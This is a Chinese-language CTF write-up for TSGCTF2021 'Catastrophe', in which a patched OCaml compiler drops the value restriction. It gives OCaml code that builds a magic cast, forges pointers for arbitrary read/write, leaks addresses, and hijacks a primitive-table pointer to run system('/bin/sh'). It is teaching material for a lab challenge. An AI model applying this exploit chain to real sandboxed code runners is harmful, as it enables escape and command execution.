# TSGCTF2021 Catastrophe WP

## 题目简述

服务下载用户提供的 OCaml 源码，过滤 `external`、`unsafe`、`open`、`read` 等字符串，再用经过修改的 OCaml 4.12 编译器执行字节码。补丁改变了类型检查器对“非扩张表达式”的判断：

```diff
-    false
+    try let _ = Sys.getenv "PWN" in true with Not_found -> false
```

容器设置了 `PWN=x`，等价于在关键表达式上取消 value restriction。这样可以构造多态引用导致类型混淆，再利用 OCaml 字节码解释器 `ocamlrun` 的 C 运行时内存布局完成任意读写和函数指针劫持。

## 解题过程

### 1. 从错误泛化得到 `Obj.magic` 等价物

利用被破坏的 value restriction 定义：

```ocaml
let magic x =
  let l = ref None in
  l := Some x;
  let Some x = !l in
  x
```

正常 OCaml 不会把可变引用中的类型变量自由泛化；补丁却让同一引用能在写入和读取时采用不同类型，于是 `magic` 实际具有把任意 `'a` 解释为任意 `'b` 的能力。该代码没有出现过滤器禁止的 `unsafe`、`external` 或 `match` 字符串。

### 2. 用 `Bytes` 伪造指针并建立读写原语

题目模板允许使用经过裁剪的 `Bytes` 模块。创建 8 字节对象，把地址的低 7 字节逐字节写入，再通过 `magic` 改解释类型：

```ocaml
let set_int bs v =
  set bs 0 (char_of_int ((v lsr  0) mod 256));
  set bs 1 (char_of_int ((v lsr  8) mod 256));
  (* 依次写到第 6 字节 *)
  ()

let toptr v =
  let bs = create 8 in
  set_int bs v;
  magic bs
```

把 `toptr address` 当作引用解引用即可读取指定地址；反过来把目标对象 `magic` 成 `Bytes` 并调用 `set_int`，就能覆盖其底层字。

### 3. 泄露堆、`ocamlrun` 基址和 primitive table

先把闭包 `(fun x -> x)` 混淆成引用并读取内部字段，结合题目构建的固定偏移得到 OCaml 堆基址：

```ocaml
let x = magic (fun x -> x) in
let heap_base = !x * 2 - 0x33a44 in
let table = heap_base + 0x366f0
```

`table` 指向字节码运行时的 C primitive 表。表内偏移 `0x708` 保存 `caml_int_of_string` 一类原语的代码地址；任意读取得它后，再减去题目 `ocamlrun` 对应偏移 `0x6810`：

```ocaml
let primitive = !(toptr (table + 0x708)) in
let program_base = primitive * 2 - 0x6810 in
let system_addr = program_base + 0x10da0 in
```

OCaml 的 tagged integer 表示导致脚本中出现乘 2 的换算；这些常量都依赖附带的解释器构建。

### 4. 改写运行时原语并调用 `system`

官方 payload 取得 primitive table 的目标槽位，把其中的 C 函数指针改成 `system`：

```ocaml
let primitive_slot = !(toptr table) in
setptr primitive_slot system_addr
```

随后调用该槽对应的 `abs_float`，却把字符串对象强制解释成它期望的参数类型：

```ocaml
let _ = abs_float (magic "/bin/sh")
```

解释器最终按 System V ABI 调用 `system("/bin/sh")`。取得 shell 后读到：

```text
TSGCTF{superCamlFlagilisticExplicitUnsound}
```

## 方法总结

value restriction 是 Hindley–Milner 类型系统与可变状态共存时的安全边界，不是无关紧要的保守限制。一旦错误泛化多态引用，就能把纯语言层的类型混淆放大为运行时对象伪造；而 OCaml 字节码解释器由 C 实现，最终仍可落到原生函数指针劫持。由于决定性终点是任意内存访问和 `system` 调用，本题归入 Pwn。修复应恢复正确的 value restriction，而不是继续扩充源码关键词黑名单。
